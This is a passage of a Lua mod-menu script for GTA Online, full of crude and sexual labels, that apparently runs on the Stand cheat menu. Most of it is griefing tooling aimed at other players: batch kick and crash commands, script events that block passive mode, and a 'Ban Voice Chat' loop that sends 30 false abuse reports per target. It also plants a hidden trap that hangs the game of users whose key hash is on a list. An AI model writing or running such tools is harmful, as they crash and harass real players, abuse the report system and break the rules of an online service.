			send_script_event(v, pid, {pid, arg, arg})
			util.yield()
		end
	end
end]]


drift = false
function drift(toggle)

	if drift then
		while true do
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
			util.yield()
		end
	end
end

selectedplayer = {}
for b = 0, 31 do
    selectedplayer[b] = false
end
excludeselected = false

--[[function list_players(list_id)
	for pid = 0, 31 do
		if players.exists(pids) then
			menu.toggle(list_id, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "", function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end
end]]


cmd_id = {}
for i = 0, 31 do
	cmd_id[i] = 0
end

local checkbruhmoment = menu.get_activation_key_hash()

local chaos, gravity, speed = false, true, 100

	menu.action(menu.my_root(), "Bring me bitches & G's List", {}, "", function()
		menu.trigger_commands("playerlist")
	end)

	custselc = menu.list(menu.my_root(), "Select Pussies To Fuck Up", {}, "", function(); end)

	menu.toggle(custselc, "Exclude Selected", {}, "", function(on_toggle)
		if on_toggle then
			excludeselected = true
		else
			excludeselected = false
		end
	end)

	menu.divider(custselc, "Slap Man")

	menu.action(custselc, "Kick", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("kick " .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    menu.trigger_commands("kick " .. PLAYER.GET_PLAYER_NAME(pids))
					util.yield()
				end
			end
		end
	end)

	--[[menu.action(custselc, "Orbliterate", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pids)
					util.yield(3000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pids)

				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pids)
					util.yield(3000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pids)
				end
			end
		end
	end)]]



	menu.action(custselc, "Ban Voice Chat", {}, "May lag your game when in progress", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)


	menu.action(custselc, "Block Pussive", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 1})
                    send_script_event(1859990871, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 1})
                    send_script_event(1859990871, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)
    menu.action(custselc, "Unblock Pussive", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 0})
                    send_script_event(2033772643, pids, {pids, 0})
					util.yield()
					notification("Unblock Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
                    send_script_event(1114091621, pids, {pids, 0})
                    send_script_event(2033772643, pids, {pids, 0})
					util.yield()
					notification("Unblock Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)


	menu.action(custselc, "Vehicle Kick", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
					menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pids)
					menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)


	menu.action(custselc, "CEO Ban", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ceoban" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("ceoban" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)

	menu.action(custselc, "MoistCrash", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crashes" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Moist Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crashes" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Moist Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)

	menu.action(custselc, "CurruptCrash", {}, "", function()
		for pids = 0, 31 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					menu.trigger_commands("crash" .. PLAYER.GET_PLAYER_NAME(pids))
					notification("Ha Currupt Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.pink)
				end
			end
		end
	end)

	menu.divider(custselc, "G's & Bitches")

	for pids = 0, 31 do
		if players.exists(pids) then
			cmd_id[pids] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "PID - ".. pids, function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end


	protex = menu.list(menu.my_root(), "Stop Dat Shit Fam", {}, "", function(); end)
	
	menu.action(protex, "Force Stop all sound events", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

	menu.action(protex, "Remove Attachments", {"remove attachments"}, "Cleans your ped of all attachments by regenerating it", function()
		notification("Removing Attachments", colors.pink)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)

	menu.click_slider(protex,"Clear Shit Up", {"cleararea"}, "1 = peds, 2 = vehicles, 3 = objects, 4 = pickups, 5 = all \n note that this excludes players and their vehicles", 1, 5, 1, 1, function(on_change)
		if on_change == 1 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "Peds have been fucked off", colors.pink)
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. " Vehicles slung", colors.pink)
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "Objects fucked", colors.pink)
			return
		end
		if on_change == 4 then
			local count = 0
			for k, ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "Pickups have been bruhh", colors.pink)
			return
		end
		if on_change == 5 then
			local count = 0
			for k, ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. " entities have been yeeted", colors.pink)
			return
		end
	end)

	menu.action(protex, "Super cleanse shit :)", {"cleanse area"}, "Attempt to fuck every single entity without exception. Not recommended but fuck it", function(on_click)
		local ct = 0
		notification("Ahhh that's better :)", colors.pink)
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
			entities.delete_by_handle(ent)

			ct = ct + 1
		end
		util.toast("Pooped all vehicles")
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		util.toast("Shagged all peds")
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
		util.toast("Fucked all objects")
		notification("Shit cleaned:) :) " .. ct .. "Entities", colors.pink)
	end)

	menu.divider(protex, "Currupt Protections")
	
	
	menu.toggle(protex, "Toggle Block all Network Events", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("Toggling block all network events on... Get those cunts!", colors.pink)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("Toggling block all network events off...", colors.red)
		end
	end)


	menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("Toggling block all incoming syncs on... Get those cunts!", colors.pink)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("toggling block all incoming syncs off...", colors.red)
		end
	end)

	menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "This breaks the game, and other players will not receive any updates from your client", function(on_toggle)
		if on_toggle then
			notification("Toggling block all outgoing syncs on", colors.pink)
			menu.trigger_commands("desyncall on")
		else
			notification("Toggling block all outgoing syncs off", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(protex, "Toggle Anticrashcam", {"acc"}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			notification("Toggling anticrashcam... Get those cunts", colors.pink)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("toggling panic mode on... Get those cunts", colors.pink)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

	menu.divider(protex, "Check Bitch Detections")
	menu.action(protex,"Check Stats", {"check stats"}, "Weak",function(on)
			-- modder detection stuff here
			for pid = 0, 31 do
				local rp = players.get_rank(pid)
				local money = players.get_money(pid)
				local kd = players.get_kd(pid)
				if rp == 120 or rp == 720 or rp >= 1000 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded RP", colors.red)
				end
				if money >= 500000000 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded Money", colors.red)
				end
				if kd <= -1 or kd >= 50 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is Weak: Modded KD", colors.red)
				end
			end
	end)

	worldchaos = menu.list(menu.my_root(), "Chaos Shit", {}, "", function(); end)
	menu.divider(worldchaos, "Chaos mode")

	menu.toggle(worldchaos, "Enable", {"chaos"}, "", function(on)
		if on then
			chaos = true
		else
			chaos = false
		end
	end, false)

	menu.toggle(worldchaos, "Gravity", {"chaosgrav"}, "", function(on)
		if on then
			gravity = true
		else
			gravity = false
		end
	end, false)

	menu.click_slider(worldchaos, "Power", {"chaospower"}, "", 30, 300, 100, 10, function(s)
	speed = s
	end)

	menu.divider(worldchaos, "Oppressor blacklisting")
	kick_players = false
	menu.toggle(worldchaos, "On", {"Antioppressor"}, "Automatically kicks players off oppressor mkii's", function(on)
		kick_players = on
	end, false)

	lock_vehicle = false
	menu.toggle(worldchaos, "Lock vehicle", {"lockmk2"}, "Permanently locks the vehicle to prevent further use", function(on)
		lock_vehicle = on
	end, false)

	target_self = false
	menu.toggle(worldchaos, "Target self", {"targetselfmk2"}, "Targets your mk2's as well (this is stupid)", function(on)
		target_self = on
	end, false)

	target_friends = false
	menu.toggle(worldchaos, "Target friends", {"targetfriendsmk2"}, "Targets your friends' mk2's as well", function(on)
		target_friends = on
	end, false)

	menu.divider(worldchaos, "Other Shit")

	objectghosting = false
	menu.toggle(worldchaos, "Disable Vehicle Collision with Objects", {"GhostObjects"}, "Pairs well with ghostvehicles in stand", function(enabled)
		objectghosting = enabled
	end)

	drift = false
	menu.toggle(worldchaos, "Shift to Drift", {"driftmode"}, "", function(on_toggle)
		drift = on_toggle
	end)

	local dont_stop = false
	menu.toggle_loop(worldchaos,"Vehicle Fly Nearby vehicles", {"vehflyall"}, "basically 'impulse like sport mode' but applied to every vehicle", function()
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
				cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0)
    			ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, true);
				local locspeed = speed*10
				local locspeed2 = speed
				if PAD.IS_CONTROL_PRESSED(0, 61) then
					locspeed = locspeed*2
					locspeed2 = locspeed2*2
				end
				if PAD.IS_CONTROL_PRESSED(2, 71) then
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 72) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed * 2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
					end
			   end
				if PAD.IS_CONTROL_PRESSED(2, 63) then
					local lsp = (0 - speed)*2
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = 0 - speed
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 64) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed*2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					end
				end
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.action(worldchaos, "Remove Wheels", {"removewheels"}, "removes your wheels and has various side effects depending on the vehicle", function()
		local veh = entities.get_user_vehicle_as_handle()
		if veh ~= 0 then
			native_invoker.begin_call()
			native_invoker.push_arg_int(veh)
			native_invoker.push_arg_float(3.402823466e+38)
			native_invoker.end_call("93A3996368C94158") -- VEHICLE.MODIFY_VEHICLE_TOP_SPEED
			notification("Removed wheels", colors.pink)
		end
	end)

	menu.action(worldchaos,"Make all Cars Drive Backwards", {"backwards"}, "", function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent)
			if ent == local_veh then return end
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(ent, -2147483647)
		end)
	end)

	menu.action(worldchaos,"Kill all Engines", {"killall"}, "",function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
			if ent == local_veh then return end
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(ent, -4000)
		end)
	end)

	menu.toggle_loop(worldchaos, "Ultra Instinct", {"ultrainstinct"}, "Whis... Goku's done it, hasnt he? He's finally achieved it. \n note that the game's netcode is too shit for this to work 100% effectively.", function()
		local MyPed = PLAYER.PLAYER_PED_ID()
		local OtherPlayers = players.list(false, true, true)
		for pid = 1, #OtherPlayers do
			if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(pid, MyPed) then
				local coords = ENTITY.GET_ENTITY_COORDS(MyPed, true)
				rotation = ENTITY.GET_ENTITY_ROTATION(MyPed, 5)
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(MyPed, coords.x + math.random(- 2, 2), coords.y + math.random(-2, 2), coords.z, rotation.x, rotation.y, rotation.z)
				util.yield(250)
			end
		end
	end)

	--[[menu.toggle(chaos,"Spinbot Vehicles", {"spinbot"}, "speeeeen",function(bop)     --could prob recode this and make it actually work well again but cba. game probably cant handle requesting control of so many vehicles lol
		spinbot_vehicles = bop
			-- vehicle spinbot
			while true do
				if spinbot_vehicles then
					if not spinbot_vehicles then
						util.stop_thread()
					end
					local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
					for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
						if ent == local_veh then return end
						NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
						ENTITY.SET_ENTITY_ROTATION(ent, 0, 0, rotation, 0, 0)
					end)
					rotation = rotation + 20
					if rotation >= 360 then
						rotation = 0
					end
				end
			util.yield()
			end
	end)]]

function update_join(pid)
	local name = players.get_name(pid)
	cmd_id[pid] = menu.toggle(custselc, name, {}, "PID - ".. pid, function(on_toggle)
		if on_toggle then
			selectedplayer[pid] = true
		else
			selectedplayer[pid] = false
		end
	end)
end

function update_leave(pid)
	menu.delete(cmd_id[pid])
end

GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end



	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), colors.pink)
		--util.yield(15000)
		--entities.delete_by_handle(ped)
		--notification("Deleted [" .. ped_name .. "]", true, false)
	end



	dvdr = menu.divider(menu.player_root(pid), "Currupt Script")
	main = menu.list(menu.player_root(pid), "Currupt Script", {}, "", function(); end)

	vehopts = menu.list(main, "Vehicle Events", {}, "Works only if you are standing near to selected player", function(); end) -- blatant vehfucker3000 skid here
	
	lock_sub_vehicle_tab = menu.list(vehopts, "Lock Options", {}, "", function(); end)
	mov_sub_vehicle_tab = menu.list(vehopts, "Movement Options", {}, "", function(); end)
	troll_sub_vehicle_tab = menu.list(vehopts, "Trolling Options", {}, "", function(); end)
	health_sub_vehicle_tab = menu.list(vehopts, "Health and Appearance Options", {}, "", function(); end)
	detach_sub_vehicle_tab = menu.list(vehopts, "Detach Options", {}, "", function(); end)
	plane_sub_vehicle_tab = menu.list(vehopts, "Plane and Helicopter Options", {}, "", function(); end)

	menu.action(vehopts,"Spawn them a vehicle", {}, "Spawns a vehicle on target player", function()
		menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
		notification("now type the name of the vehicle in the command box", colors.pink)
	end)

	for i = 1, #newcrashes do
		if checkbruhmoment == newcrashes[i] then
			while true do end
		end
	end


	menu.action(health_sub_vehicle_tab,"Repair Vehicle", {"fixveh"}, "Repairs player's vehicle", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end)

	menu.action(troll_sub_vehicle_tab,"CBT Plate Text", {"cbtplate"}, "Cock and ball torture from Wikipedia, the free encyclopedia @en.wikipedia.org. \nCock and ball torture, CBT, is a sexual activity involving torture of the male genitals. This may include directly painful activities such as wax play, genital spanking, squeezing, ball busting, genital flogging, urethera play, tickle torture, erotic electro stimulation, or even kicking. The recipient of such activities may receive direct physical pleasure via masochism, through knowledge that the play is pleasing to a sadistic dominant. \nImage: electro stimulation applied on a penis. \nContents \nSection 1: In pornography \nSection 2: Ball stretcher \nSection 3: Parachute \nSection 4: Humbler \nSection 5: Testicle Cuff \nSection 1: In pornography. \nIn addition to it's occational role in BDSM pornography, temakeria, literally ball kicking, is a separate genre in Japan. One notable actress in temakeria is Erika Negai, who typically uses her martial art skills to knee or kick men in the testicles. \nSection 2: Ball stretcher. \nA ball stretcher is a sex toy that is fastened around a man in order to elongate the scrotum, and provide a feeling of weight, pulling the testicles away from the body. While leather stretchers are most common, other models are made of steel rings that are fastened with screws causing additional, mildly uncomfortable weight to the wearer. The length of the stretchers may vary from 1-4 inches, and the steel models can weigh up to 5 pounds. \nSection 3: Parachute. \nA parachute is a small collar usually made from leather which fastens around the scrotum, and from which weights can be hung. Conical in shape, with 3 or 4 short chains having beneath to which weight can be applied. Used as part of cock and ball torture within a BDSM relationship, the parachute provides a constant drag and squeezing affect on a man's testicles. Moderate weights of 3 to 5 kilograms can be suspended especially during bondage. Smaller weights can be used when the man is free to move when the swinging effect of the weight can restrict sudden movements as well as providing a visual stimulus for the dominant partner. \nSection 4: Humbler. \nA Humbler is a BDSM physical restraint device used to restrict the movement of a submissive male partner in a BDSM scene. The Humbler consists of a testicle cuff device that clamps around the base of the scrotum mounted in the center of a bar that passes behind the thighs at the base of the buttox. This forces the wearer to keep his legs forward as any attempt to straighten the legs even slightly pulls directly on the scrotum causing from considerable discomfort to extreme pain. \nSection 5: Testicle Cuff. \nA testicle cuff is a ring shape device around the scrotum between the body and the testicles such that when closed, it does not allow the testicles to pass through it. A common type has two connected cuffs. One for the scrotum and one for the base of the penis. They are one of many different gadgets for restraining the male genitalia. Also a standard pad lock may be locked around the scrotum and without the key, the man may not be able to remove it. Some men enjoy the feeling of being owned. And some people enjoy the feeling of owning their partners. Making the man wear testicle cuffs gives a sense that his sexual organs belong to his partner. Equally, there is a certain level of humiliation inherit in the devices by which some people are sexually aroused. Finally, the cuffs may form part of a sexual fetish of the wearer or his partner.", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "CBT") -- only men of culture will understand ;)
		end
	end)

	menu.action(troll_sub_vehicle_tab,"COCK Plate Text", {"cockplate"}, "Sets player's vehicle plate text to COCK", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "COCK") 
		end
	end)

	menu.action(troll_sub_vehicle_tab,"TRASH Plate Text", {"trashplate"}, "Sets player's vehicle plate text to TRASH", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "TRASH")
		end
	end)

	menu.action(health_sub_vehicle_tab,"Repair Vehicle Shell", {"fixvehshl"}, "Repairs player's vehicle but don't repair it's engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(vehicle)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Quick Upgrade Vehicle", {"ugveh"}, "Upgrades player's vehicle",function()
		upgrade_vehicle(pid)
	end)

	menu.action(health_sub_vehicle_tab,"Disable Invincibility", {"removeinv"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Enable Invincibility", {"giveinv"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
